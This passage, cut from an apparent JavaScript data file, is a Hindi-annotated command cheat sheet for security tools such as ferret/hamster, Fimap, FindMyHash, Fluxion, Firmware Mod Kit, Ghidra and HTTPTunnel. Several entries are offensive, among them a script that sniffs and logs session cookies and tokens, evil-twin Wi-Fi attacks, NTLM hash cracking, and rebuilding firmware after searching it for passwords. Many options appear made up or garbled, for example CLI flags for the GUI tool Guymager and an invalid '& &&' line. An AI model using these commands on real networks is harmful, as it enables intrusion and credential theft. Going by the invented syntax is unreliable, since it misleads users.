      { cmd: "ferret -i eth0 -o - | hamster", desc: "ferret से hamster तक पाइप" },
      { cmd: "ferret -i eth0 | grep -i 'cookie\\|session\\|token'", desc: "सेशन टोकन फ़िल्टर" },
      { cmd: "ferret -i eth0 -v 2>&1 | awk '/GET|POST/ {print $2, $3}'", desc: "HTTP रिक्वेस्ट मॉनिटर" },
      { cmd: "ferret -r capture.pcap -c -o cookies.txt", desc: "PCAP से कुकी निकालें" }
    ],
    script: "echo 'सेशन हाइजैकिंग शुरू...'\nferret -i eth0 -v -c 2>&1 | while read line; do\n  echo \"[$(date +%H:%M:%S)] $line\" >> session_dump.log\ndone &"
  },
  Fierce: {
    install: { pkg: "fierce" },
    options: [
      ["-dns <domain>", "लक्ष्य डोमेन"],
      ["-wordlist <file>", "वर्डलिस्ट फ़ाइल"],
      ["-file <file>", "आउटपुट फ़ाइल"],
      ["-connect", "कनेक्ट टेस्ट"],
      ["-full", "पूर्ण स्वीप"],
      ["-wide", "वाइड सबनेट"],
      ["-delay <sec>", "विलंब सेकंड"],
      ["-traverse <n>", "ट्रैवर्सल सीमा"],
      ["-tcp", "TCP स्कैन"],
      ["-threads <n>", "थ्रेड काउंट"]
    ],
    basic: [
      { cmd: "fierce -dns example.com", desc: "DNS सबडोमेन खोज" },
      { cmd: "fierce -dns example.com -wordlist /usr/share/wordlists/dnsmap.txt", desc: "कस्टम वर्डलिस्ट" },
      { cmd: "fierce -dns example.com -file output.txt", desc: "परिणाम फ़ाइल में" },
      { cmd: "fierce -dns example.com -connect", desc: "कनेक्शन परीक्षण के साथ" },
      { cmd: "fierce -dns example.com -full", desc: "पूर्ण DNS स्वीप" },
      { cmd: "fierce -dns example.com -wide", desc: "वाइड रेंज स्कैन" },
      { cmd: "fierce -dns example.com -delay 2", desc: "2 सेकंड विलंब" },
      { cmd: "fierce -dns example.com -threads 10", desc: "10 थ्रेड्स के साथ" },
      { cmd: "fierce -dns example.com -traverse 5", desc: "5 लेवल ट्रैवर्सल" },
      { cmd: "fierce -dns example.com -tcp", desc: "TCP सबडोमेन स्कैन" }
    ],
    advanced: [
      { cmd: "fierce -dns example.com -wordlist /usr/share/wordlists/dnsmap.txt -file result.txt -full 2>&1 | tee scan.log", desc: "पूर्ण स्कैन लॉग करें" },
      { cmd: "fierce -dns example.com -wide -connect | grep -i 'alive\\|found'", desc: "जीवित होस्ट फ़िल्टर" },
      { cmd: "for domain in $(cat domains.txt); do fierce -dns $domain -file ${domain}_scan.txt -threads 5; done", desc: "एकाधिक डोमेन स्कैन" },
      { cmd: "fierce -dns example.com -dns 8.8.8.8 -wordlist custom.txt", desc: "कस्टम DNS सर्वर" },
      { cmd: "fierce -dns example.com -full -connect -tcp 2>&1 | grep -E 'Host|Zone|Error'", desc: "ज़ोन ट्रांसफ़र जाँच" }
    ],
    script: "echo 'DNS एनुमरेशन शुरू...'\nfierce -dns example.com -wordlist /usr/share/wordlists/dnsmap.txt -full -file fierce_report.txt -threads 10 -delay 1 2>&1 | tee fierce_run.log\ngrep -i 'found' fierce_report.txt\necho 'स्कैन पूर्ण'"
  },
  Fimap: {
    install: { pkg: "fimap" },
    options: [
      ["-u <url>", "लक्ष्य URL"],
      ["-p <param>", "पैरामीटर"],
      ["-d <data>", "POST डेटा"],
      ["-c <cookie>", "कुकी"],
      ["-x <proxy>", "प्रॉक्सी"],
      ["-t <threat>", "थ्रेट लेवल"],
      ["-o <file>", "आउटपुट"],
      ["-s", "साइलेंट"],
      ["-v", "वर्बोज़"],
      ["-l <file>", "लॉग फ़ाइल"]
    ],
    basic: [
      { cmd: "fimap -u http://example.com/page.php?id=1", desc: "LFI/RFI स्कैन" },
      { cmd: "fimap -u http://example.com -p file", desc: "पैरामीटर स्कैन" },
      { cmd: "fimap -u http://example.com/login.php -d 'user=admin&pass=test'", desc: "POST डेटा स्कैन" },
      { cmd: "fimap -u http://example.com -c 'PHPSESSID=abc123'", desc: "कुकी के साथ स्कैन" },
      { cmd: "fimap -u http://example.com -x http://127.0.0.1:8080", desc: "प्रॉक्सी के साथ" },
      { cmd: "fimap -u http://example.com -t high", desc: "हाई थ्रेट स्कैन" },
      { cmd: "fimap -u http://example.com -o report.txt", desc: "रिपोर्ट सेव" },
      { cmd: "fimap -u http://example.com -v", desc: "वर्बोज़ मोड" },
      { cmd: "fimap -u http://example.com -l /tmp/fimap.log", desc: "लॉग फ़ाइल" },
      { cmd: "fimap -u http://example.com/index.php?page=home", desc: "LFI पैरामीटर स्कैन" }
    ],
    advanced: [
      { cmd: "fimap -u http://example.com -v -x http://127.0.0.1:8080 2>&1 | tee fimap.log", desc: "प्रॉक्सी और लॉग" },
      { cmd: "fimap -u http://example.com -t high -s 2>&1 | grep -i 'vuln\\|found'", desc: "कमज़ोरियाँ फ़िल्टर" },
      { cmd: "for id in $(seq 1 100); do fimap -u \"http://example.com/page.php?id=$id\" -s; done", desc: "ID रेंज स्कैन" },
      { cmd: "fimap -u http://example.com -p file -c 'admin=1' -x http://127.0.0.1:8080", desc: "मल्टीपल पैरामीटर स्कैन" },
      { cmd: "sqlmap -u http://example.com/page.php?id=1 --batch && fimap -u http://example.com/page.php?id=1", desc: "SQLmap और fimap संयोजन" }
    ],
    script: "for url in $(cat targets.txt); do\n  echo 'स्कैन:' $url\n  fimap -u $url -t high -v -l \"fimap_$(echo $url | sha1sum | cut -c1-8).log\" 2>/dev/null\ndone\necho 'सभी Fimap स्कैन पूर्ण'"
  },
  FindMyHash: {
    install: { pkg: "find-my-hash" },
    options: [
      ["-t <hash>", "हैश टाइप"],
      ["-h <hash>", "हैश मान"],
      ["-f <file>", "हैश फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-o <file>", "आउटपुट"],
      ["-w <file>", "वर्डलिस्ट"],
      ["-l", "लूप मोड"],
      ["-s", "साइलेंट"],
      ["-d", "डीबग"],
      ["--help", "सहायता"]
    ],
    basic: [
      { cmd: "findmyhash -h 5d41402abc4b2a76b9719d911017c592", desc: "MD5 हैश खोजें" },
      { cmd: "findmyhash -t md5 -f hashes.txt", desc: "फ़ाइल से हैश खोजें" },
      { cmd: "findmyhash -t sha1 -h dc724af18fbdd4e59189f5fe768a5f8311527050", desc: "SHA1 हैश खोजें" },
      { cmd: "findmyhash -h 5d41402abc4b2a76b9719d911017c592 -v", desc: "वर्बोज़ हैश खोज" },
      { cmd: "findmyhash -t md5 -f hashlist.txt -o found.txt", desc: "परिणाम फ़ाइल में सेव" },
      { cmd: "findmyhash -t ntlm -h 209c6174da490caeb422f3fa5a7ae634", desc: "NTLM हैश खोजें" },
      { cmd: "findmyhash -h 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8", desc: "SHA1 MD5 दोनों" },
      { cmd: "findmyhash -t sha256 -h 6ca13d52ca70c883e0f0bb101e425a89e8624de51db2d2392593af6a84118090", desc: "SHA256 हैश खोज" },
      { cmd: "findmyhash -t mysql -h 81f5e21e35407d884a6ed4d731a1fb01", desc: "MySQL हैश खोजें" },
      { cmd: "findmyhash -s -h 5d41402abc4b2a76b9719d911017c592", desc: "साइलेंट हैश खोज" }
    ],
    advanced: [
      { cmd: "findmyhash -t md5 -f hashes.txt -v -o results.txt 2>&1 | tee search.log", desc: "बैच हैश खोज लॉग" },
      { cmd: "while read hash; do findmyhash -t md5 -h $hash -s; done < hashes.txt", desc: "लूप से हैश खोज" },
      { cmd: "findmyhash -f /tmp/ntlm_hashes.txt -t ntlm -o /tmp/cracked.txt 2>&1 | grep -i 'found'", desc: "NTLM हैश क्रैक" },
      { cmd: "hash-identifier 5d41402abc4b2a76b9719d911017c592 && findmyhash -t md5 -h 5d41402abc4b2a76b9719d911017c592", desc: "हैश आइडेंटिफ़ाई और खोज" },
      { cmd: "for algo in md5 sha1 sha256 ntlm; do findmyhash -t $algo -h target_hash -s; done", desc: "सभी एल्गोरिदम परीक्षण" }
    ],
    script: "echo 'हैश क्रैकिंग शुरू...'\nwhile IFS= read -r hash; do\n  result=$(findmyhash -t md5 -h \"$hash\" -s 2>/dev/null)\n  [ -n \"$result\" ] && echo \"$hash -> $result\" >> cracked.txt\ndone < hashes.txt\necho 'क्रैक किए गए:' $(wc -l < cracked.txt)"
  },
  Finger: {
    install: { pkg: "finger" },
    options: [
      ["-l", "लॉन्ग फ़ॉर्मेट"],
      ["-p", "पोर्ट निर्दिष्ट"],
      ["-s", "शॉर्ट फ़ॉर्मेट"],
      ["-m", "मशीन सूची"],
      ["-f", "फ़ाइल से"],
      ["-h", "सहायता"],
      ["-v", "वर्बोज़"],
      ["-i", "IP पता"],
      ["-4", "IPv4"],
      ["-6", "IPv6"]
    ],
    basic: [
      { cmd: "finger user@example.com", desc: "यूज़र जानकारी प्राप्त करें" },
      { cmd: "finger -l user@example.com", desc: "विस्तृत यूज़र जानकारी" },
      { cmd: "finger @example.com", desc: "सभी यूज़र सूची" },
      { cmd: "finger -s user@example.com", desc: "शॉर्ट फ़ॉर्मेट" },
      { cmd: "finger -p 79 user@example.com", desc: "पोर्ट 79 पर फ़िंगर" },
      { cmd: "finger -l root@192.168.1.1", desc: "रिमोट यूज़र जानकारी" },
      { cmd: "finger -m user@example.com", desc: "मशीन सूची" },
      { cmd: "finger -f users.txt", desc: "फ़ाइल से यूज़र चेक" },
      { cmd: "finger admin@example.com", desc: "एडमिन यूज़र जाँच" },
      { cmd: "finger -v user@example.com", desc: "वर्बोज़ फ़िंगर" }
    ],
    advanced: [
      { cmd: "finger -l -s user@example.com 2>&1 | tee finger_output.txt", desc: "पूर्ण फ़िंगर आउटपुट" },
      { cmd: "for user in admin root test backup; do finger $user@example.com -s; done", desc: "एकाधिक यूज़र जाँच" },
      { cmd: "finger @example.com 2>&1 | grep -i 'login\\|name\\|user'", desc: "यूज़र नाम फ़िल्टर" },
      { cmd: "nmap -sV -p 79 example.com && finger @example.com", desc: "फ़िंगर पोर्ट स्कैन और जाँच" },
      { cmd: "finger -l user@example.com 2>&1 | awk 'NR>1' | head -10", desc: "पहली 10 लाइनें" }
    ],
    script: "for host in $(cat finger_hosts.txt); do\n  echo \"=== $host ===\"\n  finger @$host 2>/dev/null | grep -v 'no such user'\ndone > finger_scan.txt\necho 'फ़िंगर स्कैन पूर्ण'"
  },
  FirmwareModKit: {
    install: { pkg: "firmware-mod-kit" },
    options: [
      ["-e <file>", "फ़र्मवेयर निकालें"],
      ["-b <file>", "फ़र्मवेयर बनाएँ"],
      ["-d <dir>", "आउटपुट डायर"],
      ["-p <plat>", "प्लेटफ़ॉर्म"],
      ["-c <file>", "कॉन्फ़िग"],
      ["-v", "वर्बोज़"],
      ["-x <cmd>", "एक्सट्रैक्टर"],
      ["-m", "माउंट फ़र्मवेयर"],
      ["-k", "कर्नेल निकालें"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "fmk -e firmware.bin -d /tmp/fw_extract", desc: "फ़र्मवेयर निकालें" },
      { cmd: "fmk -b /tmp/fw_extract -o new_firmware.bin", desc: "फ़र्मवेयर बनाएँ" },
      { cmd: "fmk -e firmware.bin -v", desc: "वर्बोज़ फ़र्मवेयर निष्कर्षण" },
      { cmd: "fmk -k firmware.bin -o kernel.bin", desc: "कर्नेल निकालें" },
      { cmd: "fmk -e router_fw.bin -p broadcom", desc: "Broadcom फ़र्मवेयर" },
      { cmd: "fmk -m firmware.bin -d /mnt/fw", desc: "फ़र्मवेयर माउंट" },
      { cmd: "fmk -e firmware.bin -c /etc/fmk.conf", desc: "कॉन्फ़िग से निकालें" },
      { cmd: "fmk -e firmware.bin -x unsquashfs", desc: "squashfs के साथ निकालें" },
      { cmd: "fmk -b /tmp/fw -o modified.bin -v", desc: "वर्बोज़ फ़र्मवेयर बिल्ड" },
      { cmd: "fmk -e upgrade.bin -d /tmp/upgrade_fw", desc: "अपग्रेड फ़र्मवेयर" }
    ],
    advanced: [
      { cmd: "fmk -e firmware.bin -d /tmp/fw -v 2>&1 | tee extract.log", desc: "निष्कर्षण लॉग करें" },
      { cmd: "fmk -e firmware.bin -d /tmp/fw && grep -r 'password\\|admin\\|root' /tmp/fw/", desc: "फ़र्मवेयर में पासवर्ड खोजें" },
      { cmd: "fmk -e firmware.bin -d /tmp/fw && sed -i 's|/bin/sh|/bin/bash|' /tmp/fw/rootfs/etc/passwd && fmk -b /tmp/fw -o hack.bin", desc: "फ़र्मवेयर मॉडिफ़ाई और रीबिल्ड" },
      { cmd: "binwalk -e firmware.bin && for f in _firmware.bin.extracted/*; do fmk -e $f -d /tmp/ext_$(basename $f); done", desc: "binwalk और fmk संयोजन" },
      { cmd: "fmk -e firmware.bin && sha256sum firmware.bin && find /tmp/fw -type f -exec file {} \\; > file_list.txt", desc: "फ़र्मवेयर फ़ाइल सूची" }
    ],
    script: "mkdir -p /tmp/fw_analysis\nfmk -e $1 -d /tmp/fw_analysis/extracted -v 2>&1 | tee /tmp/fw_analysis/extract.log\ngrep -rn 'passwd\\|shadow\\|key\\|cert' /tmp/fw_analysis/extracted/rootfs 2>/dev/null > /tmp/fw_analysis/secrets.txt\necho 'फ़र्मवेयर विश्लेषण पूर्ण'"
  },
  Fluxion: {
    install: { pkg: "fluxion" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-s <ssid>", "SSID"],
      ["-b <bssid>", "BSSID"],
      ["-c <ch>", "चैनल"],
      ["-e <file>", "हैंडशेक फ़ाइल"],
      ["-w <file>", "वर्डलिस्ट"],
      ["-m <mode>", "हमला मोड"],
      ["-t <time>", "टाइमआउट"],
      ["-v", "वर्बोज़"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "fluxion -i wlan0", desc: "Fluxion इंटरैक्टिव मोड" },
      { cmd: "fluxion -i wlan0 -s MyWiFi -b 00:11:22:33:44:55 -c 6", desc: "लक्ष्य निर्दिष्ट करें" },
      { cmd: "fluxion -i wlan0 -m evil_twin", desc: "एविल ट्विन अटैक" },
      { cmd: "fluxion -i wlan0 -e handshake.cap", desc: "हैंडशेक का उपयोग" },
      { cmd: "fluxion -i wlan0 -w /usr/share/wordlists/rockyou.txt", desc: "वर्डलिस्ट से क्रैक" },
      { cmd: "fluxion -i wlan0 -s MyWiFi -t 300", desc: "300 सेकंड टाइमआउट" },
      { cmd: "fluxion -i wlan0 -v", desc: "वर्बोज़ मोड" },
      { cmd: "fluxion -i wlan0 -m wpa_attack", desc: "WPA अटैक मोड" },
      { cmd: "fluxion -i wlan0 -s TestAP -b 00:11:22:33:44:55", desc: "लक्षित WPA हमला" },
      { cmd: "fluxion -i wlan0 -c 11", desc: "चैनल 11 पर हमला" }
    ],
    advanced: [
      { cmd: "fluxion -i wlan0 -s MyWiFi -b 00:11:22:33:44:55 -c 6 -v 2>&1 | tee fluxion.log", desc: "पूर्ण अटैक लॉग" },
      { cmd: "fluxion -i wlan0 -s MyWiFi -w /usr/share/wordlists/rockyou.txt -m evil_twin &", desc: "एविल ट्विन बैकग्राउंड" },
      { cmd: "airodump-ng wlan0 --bssid 00:11:22:33:44:55 -c 6 -w capture && fluxion -i wlan0 -e capture-01.cap", desc: "हैंडशेक कैप्चर और फ्लक्सियन" },
      { cmd: "fluxion -i wlan0 -s MyWiFi -t 600 2>&1 | grep -i 'handshake\\|password'", desc: "हैंडशेक मिलने पर निगरानी" },
      { cmd: "for ch in 1 6 11; do fluxion -i wlan0 -c $ch -s MyWiFi -t 120; done", desc: "सभी चैनल पर प्रयास" }
    ],
    script: "airmon-ng start wlan0\nfluxion -i wlan0mon -s \"$TARGET_SSID\" -b $TARGET_BSSID -c $TARGET_CH -w /usr/share/wordlists/rockyou.txt -v 2>&1 | tee /tmp/fluxion_$(date +%s).log\necho 'Fluxion समाप्त'"
  },
  Foremost: {
    install: { pkg: "foremost" },
    options: [
      ["-i <file>", "इनपुट फ़ाइल"],
      ["-o <dir>", "आउटपुट डायरेक्टरी"],
      ["-t <types>", "फ़ाइल प्रकार"],
      ["-q", "शांत मोड"],
      ["-v", "वर्बोज़"],
      ["-s <bytes>", "स्टार्ट ऑफ़सेट"],
      ["-b <bytes>", "ब्लॉक आकार"],
      ["-k <size>", "स्किप ब्लॉक"],
      ["-c <file>", "कॉन्फ़िग फ़ाइल"],
      ["-a", "सभी प्रकार सक्षम"]
    ],
    basic: [
      { cmd: "foremost -i disk.dd -o /output", desc: "फ़ाइल कार्विंग" },
      { cmd: "foremost -i image.raw -t jpg,png,gif -o /pics", desc: "इमेज फ़ाइलें निकालें" },
      { cmd: "foremost -i evidence.dd -o /recovered -v", desc: "वर्बोज़ रिकवरी" },
      { cmd: "foremost -i /dev/sdb -o /output", desc: "डिवाइस से सीधे" },
      { cmd: "foremost -i disk.img -t pdf,doc,xls -o /docs", desc: "दस्तावेज़ रिकवर" },
      { cmd: "foremost -i image.dd -s 1024 -o /output", desc: "ऑफ़सेट से शुरू" },
      { cmd: "foremost -i evidence.dd -o /rec -q", desc: "शांत मोड रिकवरी" },
      { cmd: "foremost -i disk.dd -c /etc/foremost.conf", desc: "कॉन्फ़िग फ़ाइल से" },
      { cmd: "foremost -i image.raw -a -o /all", desc: "सभी प्रकार रिकवर" },
      { cmd: "foremost -i /dev/sdb1 -o /rec -t jpg -b 512", desc: "512 ब्लॉक आकार" }
    ],
    advanced: [
      { cmd: "foremost -i image.dd -t jpg,png,gif,pdf -v -o /recovered 2>&1 | tee foremost.log", desc: "बहु-प्रकार रिकवरी लॉग" },
      { cmd: "foremost -i disk.img -a -v 2>&1 | grep -i 'found\\|files'", desc: "मिली फ़ाइलें फ़िल्टर" },
      { cmd: "dc3dd if=/dev/sdb of=image.dd && foremost -i image.dd -o /rec", desc: "इमेज लें और कार्व" },
      { cmd: "for img in *.dd *.img *.raw; do foremost -i $img -o rec_$(basename $img); done", desc: "एकाधिक इमेज कार्व" },
      { cmd: "foremost -i image.dd -t all 2>&1 | tail -20", desc: "अंतिम 20 लाइन सारांश" }
    ],
    script: "mkdir -p /cases/case_$(date +%Y%m%d)/recovered\nforemost -i /dev/sdb -o /cases/case_$(date +%Y%m%d)/recovered -t all -v 2>&1 | tee /cases/case_$(date +%Y%m%d)/foremost.log\ncount=$(find /cases/case_$(date +%Y%m%d)/recovered -type f | wc -l)\necho \"कुल $count फ़ाइलें रिकवर\""
  },
  Ghidra: {
    install: { pkg: "ghidra" },
    options: [
      ["--headless", "हेडलेस मोड"],
      ["--import <file>", "बाइनरी इम्पोर्ट"],
      ["--analysis <file>", "विश्लेषण चलाएँ"],
      ["--postscript <file>", "स्क्रिप्ट चलाएँ"],
      ["--prescript <file>", "प्री-स्क्रिप्ट"],
      ["--process <pid>", "प्रोसेस चुनें"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["--delete", "प्रोजेक्ट डिलीट"],
      ["-v", "वर्बोज़"],
      ["--help", "सहायता"]
    ],
    basic: [
      { cmd: "ghidra --headless --import /bin/ls --analysis", desc: "हेडलेस RE विश्लेषण" },
      { cmd: "ghidra --headless --import binary.elf --postscript analyze.py", desc: "Python स्क्रिप्ट के साथ" },
      { cmd: "ghidra --headless --import /bin/bash -o /analysis/bash.gpr", desc: "प्रोजेक्ट फ़ाइल सेव" },
      { cmd: "ghidra --headless --import malware.exe --delete", desc: "अस्थायी विश्लेषण" },
      { cmd: "ghidra --headless --import /bin/ls --analysis -v", desc: "वर्बोज़ एनालिसिस" },
      { cmd: "ghidra --headless --import /usr/bin/sshd --prescript config.xml", desc: "प्री-कॉन्फ़िग एनालिसिस" },
      { cmd: "analyzeHeadless /project -import /bin/ls -analysis", desc: "analyzeHeadless लॉन्च" },
      { cmd: "analyzeHeadless /project -process binary -postScript ExportSymbols.java", desc: "सिंबल एक्सपोर्ट" },
      { cmd: "analyzeHeadless /project -import /tmp/malware -recursive", desc: "रीकर्सिव इम्पोर्ट" },
      { cmd: "ghidra --headless --import binary.macho --analysis", desc: "macOS बाइनरी एनालिसिस" }
    ],
    advanced: [
      { cmd: "analyzeHeadless /project -import /bin/ls -analysis -postScript ExportSymbols.java 2>&1 | tee ghidra.log", desc: "पूर्ण एनालिसिस लॉग" },
      { cmd: "analyzeHeadless /project -import /bin -recursive -analysis -postScript Report.java -o report.txt", desc: "सभी बाइनरी रिपोर्ट" },
      { cmd: "for f in *.elf; do analyzeHeadless /project -import $f -analysis -delete; done", desc: "एकाधिक ELF विश्लेषण" },
      { cmd: "analyzeHeadless /project -import binary.exe -analysis 2>&1 | grep -i 'function\\|symbol'", desc: "फ़ंक्शन और सिंबल फ़िल्टर" },
      { cmd: "analyzeHeadless /project -import binary -analysis -postScript 'PythonDecompile.java' 2>&1 | head -50", desc: "डीकंपाइल आउटपुट" }
    ],
    script: "PROJECT_DIR=/ghidra_projects/$(date +%Y%m%d)\nmkdir -p $PROJECT_DIR\nanalyzeHeadless $PROJECT_DIR -import /bin/ls -analysis -postScript ExportSymbols.java -o /tmp/symbols.txt 2>&1\necho 'Ghidra विश्लेषण पूर्ण'"
  },
  Guymager: {
    install: { pkg: "guymager" },
    options: [
      ["-i <file>", "इनपुट फ़ाइल"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-d <dir>", "आउटपुट डायरेक्टरी"],
      ["-f <fmt>", "फ़ॉर्मेट चुनें"],
      ["-c <size>", "चंक आकार"],
      ["-s", "साइलेंट"],
      ["-v", "वर्बोज़"],
      ["-m", "माउंट करें"],
      ["-r", "रीड-ओनली"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "guymager", desc: "GUI फ़ॉरेंसिक इमेजर" },
      { cmd: "guymager -i /dev/sdb -o /evidence/disk.img", desc: "डिस्क इमेज सेव" },
      { cmd: "guymager -i /dev/sdb -o evidence.dd -f dd", desc: "DD प्रारूप इमेज" },
      { cmd: "guymager -i /dev/sdb -o evidence.ewf -f ewf", desc: "EWF प्रारूप इमेज" },
      { cmd: "guymager -i /dev/sdb -o evidence.aff -f aff", desc: "AFF प्रारूप इमेज" },
      { cmd: "guymager -i /dev/sdb -o /evidence/case1/", desc: "डायरेक्टरी में सेव" },
      { cmd: "guymager -i /dev/sdb -o disk.img -c 64M", desc: "64MB चंक आकार" },
      { cmd: "guymager -i /dev/sdb -o disk.img -s", desc: "साइलेंट मोड" },
      { cmd: "guymager -i /dev/sdb -o disk.img -v", desc: "वर्बोज़ मोड" },
      { cmd: "guymager -i /dev/sdb -o disk.img -r", desc: "रीड-ओनली मोड" }
    ],
    advanced: [
      { cmd: "guymager -i /dev/sdb -o /evidence/case/disk.img -f dd -v 2>&1 | tee acquire.log", desc: "पूर्ण अक्विज़ीशन लॉग" },
      { cmd: "guymager -i /dev/sdb -o disk.dd -s && sha256sum disk.dd", desc: "साइलेंट इमेज और हैश" },
      { cmd: "dc3dd if=/dev/sdb of=phys.img && guymager -i phys.img -o forensics.ewf", desc: "dc3dd से इमेज फिर guymager" },
      { cmd: "for disk in sdb sdc sdd; do guymager -i /dev/$disk -o ${disk}.img &; done; wait", desc: "एकाधिक डिस्क समानांतर" },
      { cmd: "guymager -i /dev/sdb -o case.img -c 128M -v 2>&1 | grep -i 'progress\\|complete'", desc: "प्रोग्रेस मॉनिटर" }
    ],
    script: "echo 'फ़ॉरेंसिक इमेज अक्विज़ीशन...'\nguymager -i /dev/sdb -o /evidence/case_$(date +%Y%m%d)/disk.dd -f dd -c 64M -v 2>&1 | tee /evidence/acquire.log\necho 'इमेज निर्मित, हैश लिया जा रहा है'\nsha256sum /evidence/case_$(date +%Y%m%d)/disk.dd >> /evidence/checksums.txt"
  },
  HTTPEnum: {
    install: { pkg: "http-enum" },
    options: [
      ["-u <url>", "लक्ष्य URL"],
      ["-p <file>", "पेलोड फ़ाइल"],
      ["-w <file>", "वर्डलिस्ट"],
      ["-t <threads>", "थ्रेड्स"],
      ["-c <cookie>", "कुकी"],
      ["-x <proxy>", "प्रॉक्सी"],
      ["-s <code>", "स्टेटस कोड"],
      ["-o <file>", "आउटपुट"],
      ["-v", "वर्बोज़"],
      ["-r", "रीकर्सिव"]
    ],
    basic: [
      { cmd: "httpenum -u http://example.com -w /usr/share/wordlists/dirb/common.txt", desc: "डायर एनुमरेशन" },
      { cmd: "httpenum -u http://example.com -t 50", desc: "50 थ्रेड एनुम" },
      { cmd: "httpenum -u http://example.com -s 200,301", desc: "स्थिति कोड फ़िल्टर" },
      { cmd: "httpenum -u http://example.com -c 'PHPSESSID=abc'", desc: "कुकी के साथ" },
      { cmd: "httpenum -u http://example.com -x http://127.0.0.1:8080", desc: "प्रॉक्सी के साथ" },
      { cmd: "httpenum -u http://example.com -r", desc: "रीकर्सिव स्कैन" },
      { cmd: "httpenum -u http://example.com -p payloads.txt", desc: "पेलोड लिस्ट" },
      { cmd: "httpenum -u http://example.com -o results.txt", desc: "परिणाम फ़ाइल में" },
      { cmd: "httpenum -u http://example.com -v", desc: "वर्बोज़ मोड" },
      { cmd: "httpenum -u http://example.com -t 100 -s 200", desc: "100 थ्रेड सिर्फ़ 200 OK" }
    ],
    advanced: [
      { cmd: "httpenum -u http://example.com -t 50 -r -v 2>&1 | tee enum.log", desc: "रीकर्सिव एनुम लॉग" },
      { cmd: "httpenum -u http://example.com -s 200,403 -x http://127.0.0.1:8080 2>&1 | grep '200 OK'", desc: "सफल पेज प्रॉक्सी के साथ" },
      { cmd: "for ext in php asp txt; do httpenum -u http://example.com -p \"ext_${ext}.txt\" -o ${ext}_results.txt; done", desc: "एक्सटेंशन-वार स्कैन" },
      { cmd: "httpenum -u http://example.com -c 'auth=admin' -r 2>&1 | awk '{print $1, $2}'", desc: "प्रमाणीकृत एनुम" },
      { cmd: "httpenum -u http://example.com -t 200 -p /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt", desc: "बड़ी वर्डलिस्ट के साथ" }
    ],
    script: "for url in $(cat targets.txt); do\n  name=$(echo $url | sed 's|https\\?://||' | tr '/' '_')\n  httpenum -u $url -t 50 -r -o \"httpenum_${name}.txt\" -s 200,301,302 -v 2>/dev/null\ndone\necho 'HTTP एनुमरेशन पूर्ण'"
  },
  HTTPTunnel: {
    install: { pkg: "http-tunnel" },
    options: [
      ["-p <port>", "लोकल पोर्ट"],
      ["-P <port>", "रिमोट पोर्ट"],
      ["-h <host>", "रिमोट होस्ट"],
      ["-r <host>", "रीडायरेक्ट होस्ट"],
      ["-d <domain>", "DNS डोमेन"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-b <size>", "बफ़र साइज़"],
      ["-t <sec>", "टाइमआउट"],
      ["-i <iface>", "इंटरफ़ेस"]
    ],
    basic: [
      { cmd: "httptunnel -p 8888 -h example.com -P 80", desc: "HTTP टनल क्लाइंट" },
      { cmd: "httptunnel -P 8888 -r 127.0.0.1 -p 80", desc: "HTTP टनल सर्वर" },
      { cmd: "httptunnel -p 8080 -h example.com -P 443", desc: "HTTPS टनल" },
      { cmd: "httptunnel -p 1080 -h example.com -d tunnel.example.com", desc: "DNS नाम से टनल" },
      { cmd: "httptunnel -p 8888 -h example.com -P 80 -v", desc: "वर्बोज़ टनल" },
      { cmd: "httptunnel -p 9000 -h 192.168.1.100 -P 8080", desc: "IP से टनल" },
      { cmd: "httptunnel -p 8888 -h example.com -P 80 -t 30", desc: "30 सेकंड टाइमआउट" },
      { cmd: "hts -F 8888 -P 80 0.0.0.0:8080", desc: "hts सर्वर मोड" },
      { cmd: "htc -F 8888 example.com:8080", desc: "htc क्लाइंट मोड" },
      { cmd: "httptunnel -p 8888 -h example.com -P 80 -b 4096", desc: "4KB बफ़र साइज़" }
    ],
    advanced: [
      { cmd: "httptunnel -p 8888 -h example.com -P 80 -v 2>&1 | tee tunnel.log", desc: "टनल लॉग करें" },
      { cmd: "httptunnel -p 8888 -h example.com -P 80 & && curl --proxy http://127.0.0.1:8888 example.com", desc: "प्रॉक्सी के रूप में HTTP टनल" },
      { cmd: "hts -F 8888 -P 80 0.0.0.0:8080 & htc -F 8888 example.com:8080", desc: "hts/htc सर्वर-क्लाइंट" },
      { cmd: "for port in 8080 8888 9000; do httptunnel -p $port -h example.com -P 80 &; done", desc: "एकाधिक टनल पोर्ट" },
      { cmd: "httptunnel -p 8888 -h example.com -P 80 -v 2>&1 | grep -i 'connect\\|error'", desc: "कनेक्शन स्थिति मॉनिटर" }
    ],
    script: "echo 'HTTP टनल शुरू...'\nhttptunnel -p 8888 -h example.com -P 80 -v 2>&1 | tee /tmp/httptunnel.log &\nTUNNEL_PID=$!\nsleep 5\necho 'टनल चल रहा है PID:' $TUNNEL_PID"
  },
  HTTrack: {
    install: { pkg: "httrack" },
    options: [
      ["-O <dir>", "आउटपुट डायरेक्टरी"],
      ["-p <n>", "समानांतर कनेक्शन"],
      ["-%l <lang>", "भाषा चुनें"],
      ["-%r <n>", "रीकर्सन गहराई"],
      ["-%e <n>", "एक्सटेंशन फ़िल्टर"],
      ["-F <ua>", "यूज़र एजेंट"],
      ["-%P <proxy>", "प्रॉक्सी"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "httrack http://example.com -O /tmp/website", desc: "वेबसाइट मिरर करें" },
      { cmd: "httrack http://example.com -O ./example -p 3", desc: "3 समानांतर कनेक्शन" },
      { cmd: "httrack http://example.com -O . -%l en", desc: "अंग्रेज़ी भाषा मिरर" },
      { cmd: "httrack http://example.com -O ./mirror -%r 2", desc: "2 लेवल गहराई" },
      { cmd: "httrack http://example.com -O . -%e '-*.zip -*.mp3'", desc: "फ़िल्टर एक्सटेंशन" },
      { cmd: "httrack http://example.com -O . -F 'Mozilla/5.0'", desc: "कस्टम यूज़र एजेंट" },
      { cmd: "httrack http://example.com -O . -%P proxy:8080", desc: "प्रॉक्सी के माध्यम से" },
      { cmd: "httrack http://example.com -O ./site -v", desc: "वर्बोज़ मिरर" },
